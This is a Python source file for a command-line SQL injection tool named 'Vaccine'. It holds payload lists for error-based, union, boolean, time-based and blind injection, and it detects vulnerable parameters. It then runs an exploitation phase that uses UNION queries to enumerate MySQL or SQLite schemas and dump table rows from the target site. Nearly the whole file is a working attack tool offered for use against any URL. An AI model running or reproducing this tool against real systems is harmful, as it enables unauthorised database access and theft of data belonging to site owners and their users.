#!/usr/bin/env python3

import sys
import os
import json
import time
import requests
import argparse
import sqlite3
from urllib.parse import urlparse, parse_qs, urlencode
from typing import Dict, List, Tuple, Optional, Union
import re
import hashlib
from datetime import datetime

class VaccineSQLiScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'VaccineSQLiScanner/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        self.results_db = "vaccine_results.db"
        self.init_database()
        
        # payloads for different injection types
        self.payloads = {
            'error': [
                "'",
                "\"",
                "')",
                "\")",
                "'))",
                "\"))",
                "';",
                "\";",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1\" --",
                "' UNION SELECT NULL --",
                "\" UNION SELECT NULL --",
                "' AND 1=CONVERT(int, @@version) --",
                "' AND 1=CAST(@@version AS int) --",
            ],
            'union': [
                "' UNION SELECT NULL --",
                "' UNION SELECT NULL, NULL --",
                "' UNION SELECT NULL, NULL, NULL --",
                "' UNION SELECT 1 --",
                "' UNION SELECT 1,2 --",
                "' UNION SELECT 1,2,3 --",
                "' UNION SELECT version() --",
                "' UNION SELECT database() --",
                "' UNION SELECT user() --",
                "' UNION SELECT @@version --",
            ],
            'boolean': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' OR 'x'='x",
                "' OR 'x'='y",
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' OR 1=1 --",
                "' OR 1=2 --",
                "') AND ('1'='1",
                "') AND ('1'='2",
                "' AND SLEEP(1)=0 --",
            ],
            'time': [
                "' OR SLEEP(5) --",
                "' OR BENCHMARK(5000000,MD5('test')) --",
                "'; WAITFOR DELAY '00:00:05' --",
                "'; SELECT pg_sleep(5) --",
                "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                "' UNION SELECT SLEEP(5) --",
            ],
            'blind': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='2",
                "' OR IF(1=1,SLEEP(5),0) --",
                "' OR IF(1=2,SLEEP(5),0) --",
            ]
        }
        
        # fingerprinting patterns
        self.db_patterns = {
            'mysql': [
                r"MySQL",
                r"You have an error in your SQL syntax",
                r"check the manual that corresponds to your MySQL",
                r"MariaDB server",
            ],
            'sqlite': [
                r"SQLite",
                r"SQLite3",
                r"unable to open database file",
                r"database disk image is malformed",
            ]
        }

    def init_database(self):
        """Initialize SQLite database for storing results"""
        conn = sqlite3.connect(self.results_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                method TEXT,
                timestamp DATETIME,
                vulnerable INTEGER,
                db_type TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                parameter TEXT,
                payload TEXT,
                type TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS databases (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                db_name TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tables (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                db_id INTEGER,
                table_name TEXT,
                FOREIGN KEY (db_id) REFERENCES databases (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS columns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                table_id INTEGER,
                column_name TEXT,
                data_type TEXT,
                FOREIGN KEY (table_id) REFERENCES tables (id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS data_dumps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                table_id INTEGER,
                row_data TEXT,
                FOREIGN KEY (table_id) REFERENCES tables (id)
            )
        ''')
        
        conn.commit()
        conn.close()

    def save_scan(self, url: str, method: str, vulnerable: bool, db_type: str = None) -> int:
        conn = sqlite3.connect(self.results_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO scans (url, method, timestamp, vulnerable, db_type)
            VALUES (?, ?, ?, ?, ?)
        ''', (url, method, datetime.now(), 1 if vulnerable else 0, db_type))
        
        scan_id = cursor.lastrowid
        conn.commit()
        conn.close()
        
        return scan_id

    def save_vulnerability(self, scan_id: int, parameter: str, payload: str, vuln_type: str):
        """Save vulnerability details"""
        conn = sqlite3.connect(self.results_db)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO vulnerabilities (scan_id, parameter, payload, type)
            VALUES (?, ?, ?, ?)
        ''', (scan_id, parameter, payload, vuln_type))
        
        conn.commit()
        conn.close()

    def extract_parameters(self, url: str) -> Dict[str, str]:
        """Extract query parameters from URL"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Convert lists to single values
        return {k: v[0] for k, v in params.items()}

    def test_injection(self, url: str, method: str = 'GET', params: Dict = None, 
                      data: Dict = None, param_to_test: str = None, 
                      payload: str = None) -> Tuple[bool, str]:
        """Test a specific injection payload"""
        try:
            original_value = None
            test_params = params.copy() if params else {}
            test_data = data.copy() if data else {}
            
            if param_to_test:
                if params and param_to_test in params:
                    original_value = params[param_to_test]
                    test_params[param_to_test] = payload
                elif data and param_to_test in data:
                    original_value = data[param_to_test]
                    test_data[param_to_test] = payload
            
            start_time = time.time()
            
            if method.upper() == 'GET':
                response = self.session.get(url, params=test_params, timeout=10)
            else:
                response = self.session.post(url, data=test_data, timeout=10)
            
            response_time = time.time() - start_time

            error_indicators = [
                'SQL syntax',
                'MySQL',
                'SQLite',
                'database',
                'syntax error',
                'unexpected end',
                'near "',
                'column',
                'table',
                'unknown column',
                'unknown table'
            ]
            
            content = response.text.lower()
            for indicator in error_indicators:
                if indicator.lower() in content:
                    return True, f"Error detected: {indicator}"
            
            if 'sleep' in payload.lower() or 'benchmark' in payload.lower():
                if response_time > 5:
                    return True, f"Time-based delay detected: {response_time:.2f}s"
            
            # Check for boolean-based injection
            if original_value:
                # Test with true condition
                true_response = response.text
                
                # Test with false condition
                false_payload = payload.replace("1=1", "1=2").replace("'1'='1'", "'1'='2'")
                if params and param_to_test in params:
                    test_params[param_to_test] = false_payload
                elif data and param_to_test in data:
                    test_data[param_to_test] = false_payload
                
                if method.upper() == 'GET':
                    false_response = self.session.get(url, params=test_params, timeout=10).text
                else:
                    false_response = self.session.post(url, data=test_data, timeout=10).text
                
                if true_response != false_response:
                    return True, "Boolean-based injection detected"
            
            return False, ""
            
        except Exception as e:
            return False, f"Error during test: {str(e)}"

    def fingerprint_database(self, response_text: str) -> str:
        response_lower = response_text.lower()
        
        for db_type, patterns in self.db_patterns.items():
            for pattern in patterns:
                if pattern.lower() in response_lower:
                    return db_type
        
        return "unknown"

    def detect_injections(self, url: str, method: str = 'GET') -> Dict:
        results = {
            'url': url,
            'method': method,
            'vulnerable': False,
            'vulnerable_params': [],
            'database_type': 'unknown',
            'payloads_used': [],
            'databases': [],
            'tables': {},
            'columns': {},
            'data_dump': {}
        }
        
        # Extract parameters
        params = self.extract_parameters(url)
        data = {}  # For POST requests
        
        # If it's a POST request, we need to handle data differently
        # This is simplified - in real tool, you'd parse form data
        
        # Test each parameter
        for param_name in params.keys():
            print(f"\n[+] Testing parameter: {param_name}")
            
            for vuln_type, payload_list in self.payloads.items():
                for payload in payload_list:
                    print(f"  Testing {vuln_type} payload: {payload}")
                    
                    vulnerable, reason = self.test_injection(
                        url.split('?')[0],  # Base URL without query
                        method,
                        params,
                        data,
                        param_name,
                        payload
                    )
                    
                    if vulnerable:
                        results['vulnerable'] = True
                        if param_name not in results['vulnerable_params']:
                            results['vulnerable_params'].append(param_name)
                        
                        results['payloads_used'].append({
                            'parameter': param_name,
                            'payload': payload,
                            'type': vuln_type,
                            'reason': reason
                        })
                        
                        # Try to fingerprint database
                        if reason.startswith("Error detected"):
                            test_response = self.session.get(
                                url.split('?')[0], 
                                params={**params, param_name: payload}
                            ).text if method == 'GET' else self.session.post(
                                url.split('?')[0], 
                                data={**data, param_name: payload}
                            ).text
                            
                            db_type = self.fingerprint_database(test_response)
                            if db_type != "unknown":
                                results['database_type'] = db_type
        
        return results

    def exploit_vulnerability(self, url: str, method: str, param: str, db_type: str):
        results = {}
        
        if db_type == 'mysql':
            results = self.exploit_mysql(url, method, param)
        elif db_type == 'sqlite':
            results = self.exploit_sqlite(url, method, param)
        
        return results

    def exploit_mysql(self, url: str, method: str, param: str) -> Dict:
        """MySQL"""
        injection_results = {
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        base_url = url.split('?')[0]
        params = self.extract_parameters(url)
        
        print("\n[+] Extracting database names...")
        payload = f"' UNION SELECT schema_name, NULL FROM information_schema.schemata --"
        params[param] = payload
        
        if method == 'GET':
            response = self.session.get(base_url, params=params)
        else:
            response = self.session.post(base_url, data=params)
        
        # Parse response for database names (simplified)
        # In real tool, you'd parse the HTML response
        content = response.text
        injection_results['databases'] = self.extract_from_response(content)
        
        if injection_results['databases']:
            db_name = injection_results['databases'][0]
            print(f"\n[+] Extracting tables from database: {db_name}")
            
            payload = f"' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='{db_name}' --"
            params[param] = payload
            
            if method == 'GET':
                response = self.session.get(base_url, params=params)
            else:
                response = self.session.post(base_url, data=params)
            
            tables = self.extract_from_response(response.text)
            injection_results['tables'][db_name] = tables
            
            if tables:
                table_name = tables[0]
                print(f"\n[+] Extracting columns from table: {table_name}")
                
                payload = f"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='{table_name}' --"
                params[param] = payload
                
                if method == 'GET':
                    response = self.session.get(base_url, params=params)
                else:
                    response = self.session.post(base_url, data=params)
                
                columns = self.extract_from_response(response.text)
                injection_results['columns'][table_name] = columns
                
                if columns:
                    print(f"\n[+] Dumping data from table: {table_name}")
                    col_list = ', '.join(columns)
                    payload = f"' UNION SELECT {col_list}, NULL FROM {table_name} --"
                    params[param] = payload
                    
                    if method == 'GET':
                        response = self.session.get(base_url, params=params)
                    else:
                        response = self.session.post(base_url, data=params)
                    
                    injection_results['data_dump'][table_name] = self.extract_data(response.text, len(columns))
        
        return injection_results

    def exploit_sqlite(self, url: str, method: str, param: str) -> Dict:
        """Exploit SQLite database"""
        injection_results = {
            'databases': ['main'],  # SQLite typically has one main database
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        base_url = url.split('?')[0]
        params = self.extract_parameters(url)
        
        # Get table names
        print("\n[+] Extracting table names from SQLite...")
        payload = f"' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --"
        params[param] = payload
        
        if method == 'GET':
            response = self.session.get(base_url, params=params)
        else:
            response = self.session.post(base_url, data=params)
        
        tables = self.extract_from_response(response.text)
        injection_results['tables']['main'] = tables
        
        if tables:
            # Get columns from first table
            table_name = tables[0]
            print(f"\n[+] Extracting columns from table: {table_name}")
            
            # SQLite pragma for column info
            payload = f"' UNION SELECT sql, NULL FROM sqlite_master WHERE name='{table_name}' --"
            params[param] = payload
            
            if method == 'GET':
                response = self.session.get(base_url, params=params)
            else:
                response = self.session.post(base_url, data=params)
            
            create_stmt = self.extract_from_response(response.text)
            if create_stmt:
                columns = self.parse_sqlite_columns(create_stmt[0])
                injection_results['columns'][table_name] = columns
                
                if columns:
                    # Dump data
                    print(f"\n[+] Dumping data from table: {table_name}")
                    col_list = ', '.join(columns)
                    payload = f"' UNION SELECT {col_list}, NULL FROM {table_name} --"
                    params[param] = payload
                    
                    if method == 'GET':
                        response = self.session.get(base_url, params=params)
                    else:
                        response = self.session.post(base_url, data=params)
                    
                    injection_results['data'][table_name] = self.extract_data(response.text, len(columns))
        
        return injection_results

    def extract_from_response(self, content: str) -> List[str]:
        """Extract potential data from response"""
        # This is a simplified version - real implementation would parse HTML
        # and look for data in tables or specific patterns
        lines = content.split('\n')
        extracted = []
        
        for line in lines:
            # Look for patterns that might be database/table/column names
            clean_line = line.strip()
            if (len(clean_line) < 50 and len(clean_line) > 2 and 
                ' ' not in clean_line and 
                '.' not in clean_line and
                clean_line.lower() not in ['null', 'none', ''] and
                re.match(r'^[a-zA-Z0-9_]+$', clean_line)):
                extracted.append(clean_line)
        
        return list(set(extracted))[:10]  # Return unique values, limit to 10

    def extract_data(self, content: str, num_columns: int) -> List[List[str]]:
        """Extract tabular data from response"""
        # Simplified data extraction
        lines = content.split('\n')
        data = []
        
        for line in lines:
            if '|' in line:
                row = [cell.strip() for cell in line.split('|') if cell.strip()]
                if len(row) == num_columns:
                    data.append(row)
        
        return data[:20]  # Limit to 20 rows

    def parse_sqlite_columns(self, create_stmt: str) -> List[str]:
        """Parse SQLite CREATE TABLE statement to extract column names"""
        columns = []
        # Simple regex to find column definitions
        pattern = r'CREATE TABLE \w+\s*\((.*?)\)'
        match = re.search(pattern, create_stmt, re.IGNORECASE | re.DOTALL)
        
        if match:
            column_defs = match.group(1).split(',')
            for col_def in column_defs:
                col_name = col_def.strip().split()[0].strip('"\'`[]')
                columns.append(col_name)
        
        return columns

    def generate_report(self, results: Dict, output_file: str = None):
        """Generate JSON report"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"vaccine_report_{timestamp}.json"
        
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        print(f"\n[+] Report saved to: {output_file}")
        return output_file

def main():
    parser = argparse.ArgumentParser(
        description='Vaccine',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''Examples:
  %(prog)s "http://example.com/page.php?id=1"
  %(prog)s -X POST "http://example.com/login.php"
  %(prog)s -o report.json "http://example.com/page.php?id=1"
        '''
    )
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-X', '--method', default='GET', choices=['GET', 'POST'], help='HTTP method (default: GET)')
    
    args = parser.parse_args()
    
    print(f"""
Vaccine                
    
Target: {args.url}
Method: {args.method}
Output: {args.output if args.output else 'Default'}
    """)
    
    scanner = VaccineSQLiScanner()
    
    print("\n[+] Starting SQL injection tests...")
    results = scanner.detect_injections(args.url, args.method)
    
    if results['vulnerable']:
        print("\n[!] VULNERABLE PARAMETERS FOUND!")
        print(f"    Parameters: {', '.join(results['vulnerable_params'])}")
        print(f"    Database Type: {results['database_type']}")
        
        scan_id = scanner.save_scan(
            args.url, 
            args.method, 
            True, 
            results['database_type']
        )
        
        for vuln in results['payloads_used']:
            scanner.save_vulnerability(
                scan_id,
                vuln['parameter'],
                vuln['payload'],
                vuln['type']
            )
        
        if results['vulnerable_params']:
            print("\n[+] Starting exploitation phase...")
            param = results['vulnerable_params'][0]
            injection_results = scanner.exploit_vulnerability(
                args.url,
                args.method,
                param,
                results['database_type']
            )
            
            results.update(injection_results)
            
            print("\n[+] SUMMARY:")
            print(f"    Databases found: {len(results.get('databases', []))}")
            if 'tables' in results:
                for db, tables in results['tables'].items():
                    print(f"    Tables in {db}: {len(tables)}")
            if 'columns' in results:
                for table, columns in results['columns'].items():
                    print(f"    Columns in {table}: {len(columns)}")
            if 'data_dump' in results:
                for table, data in results['data'].items():
                    print(f"    Rows dumped from {table}: {len(data)}")
    else:
        print("\n[-] No SQL injections detected")
        scanner.save_scan(args.url, args.method, False)
    
    report_file = scanner.generate_report(results, args.output)
    print(f"\n[+] Scan completed!")
    print(f"    Report: {report_file}")
    print(f"    Database: {scanner.results_db}")

if __name__ == "__main__":
    main()
